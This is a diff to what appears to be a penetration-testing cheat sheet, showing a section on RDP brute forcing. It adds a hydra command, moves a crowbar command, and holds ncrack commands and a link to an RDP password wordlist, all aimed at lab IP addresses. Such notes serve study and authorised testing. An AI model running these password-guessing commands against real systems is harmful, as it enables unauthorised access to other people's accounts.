@@ -735,9 +735,13 @@ xfreerdp /v:(target) /u:(user) /p:(password)
 * Brute force 
 ```bf
 rdesktop 192.168.1.101 //check version and sometimes username
+
+hydra -V -f -L user.txt -P /dp_passlist.txt rdp://10.11.1.7
+
+crowbar -b rdp -s 10.11.1.7/32 -u root -C rdp_passlist.txt -n 1
+
 ncrack -vv -u Administrator -P /root/passwords.txt rdp://192.168.1.101
 ncrack -vv -u Administrator -P /root/passwords.txt -p 3389 192.168.1.101
-crowbar -b rdp -s 10.11.1.7/32 -u root -C rdp_passlist.txt -n 1
 ```
 * [RDP Wordlist](https://raw.githubusercontent.com/jeanphorn/wordlist/master/rdp_passlist.txt)
 * msfconsole for ms12-020 is a dos attack; cant use
